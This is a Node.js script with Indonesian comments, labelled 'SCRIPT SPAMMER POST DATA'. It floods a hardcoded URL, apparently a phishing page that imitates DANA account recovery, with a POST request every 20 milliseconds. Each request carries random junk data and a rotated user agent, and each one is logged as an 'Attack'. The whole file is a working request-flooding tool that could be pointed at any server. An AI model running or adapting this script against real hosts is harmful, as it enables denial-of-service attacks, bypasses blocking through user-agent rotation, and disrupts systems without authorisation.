const axios = require('axios');
const randomUseragent = require('random-useragent');
const chalk = require('chalk');
const console = require('console');
const fs = require('fs');

// Menambahkan output ke dalam file
function randomText(length) {
  const allowedChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let randomString = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * allowedChars.length);
    randomString += allowedChars.charAt(randomIndex);
  }

  return randomString;
}

/*RANDOM TEXT GEN*/
var one = randomText(1000)
var two = randomText(1000)
var three = randomText(1000)

// URL tempat Anda ingin mengirim POST request
const url = 'https://pemulihan-akun-dana-id.c1.is/lD/sendPin.php'

// Data POST yang ingin Anda kirim
const postData = {
 inpsms: 'https://pemulihan-akun-dana-id.c1.is/lD/sendPin.php' + one

};

// Interval waktu antara setiap POST request (dalam milidetik)
const requestInterval = 20; // 2 detik

let nomorProses = 1; // Inisialisasi nomor proses

// Fungsi untuk membuat POST request dengan user agent acak
function makePostRequest() {
  const userAgent = randomUseragent.getRandom();
  const headers = {
    'User-Agent': userAgent,
    'Content-Type': 'application/x-www-form-urlencoded'
  };

  axios.post(url, postData, { headers })
    .then(response => {
      if (response.status === 200) {
        process.stdout.write(
          '\r' + // Menghapus karakter sebelumnya
          chalk.cyan(`[Attack ${nomorProses}]`) +
          chalk.white(' Respon Server => ') +
          chalk.green(response.status + ' OK') +
          chalk.white(' •> ') +
          chalk.green('[ SUCCES SEND ]') +
          '                      '
          
        );
        
        nomorProses++;
      }
    })
    .catch(error => {
     if(error.message == 'Client network socket disconnected before secure TLS connection was established'){
      process.stdout.write(
        '\r' + // Menghapus karakter sebelumnya
        chalk.cyan(`[Attack ${nomorProses}]`) +
        chalk.white(' Respon Server => ') +
        chalk.yellow() +
        chalk.white(' •>') +
        chalk.red(` [ CONNECTION ERROR ]`)+
        '                           '       
      );
      nomorProses++;
    }else{
    
      process.stdout.write(
        '\r' + // Menghapus karakter sebelumnya
        chalk.cyan(`[Attack ${nomorProses}]`) +
        chalk.white(' Respon Server => ') +
        chalk.yellow() +
        chalk.white(' •>') +
        chalk.red(` [ ${error.message} ]`) + 
        '                               '
        
      );
      nomorProses++;
      }
    });
}


console.clear()
setTimeout(function () {
 var kata = `
#################################################
#                                               # 
#          SCRIPT SPAMMER POST DATA             # 
#                 BY BUNG ABAY                  # 
#################################################

• TARGET : ${url}
• METHOD : POST
• DEBUG :
`
console.log(kata)
},10)

// Membuat POST request dengan interval waktu
const intervalId = setInterval(makePostRequest, requestInterval);
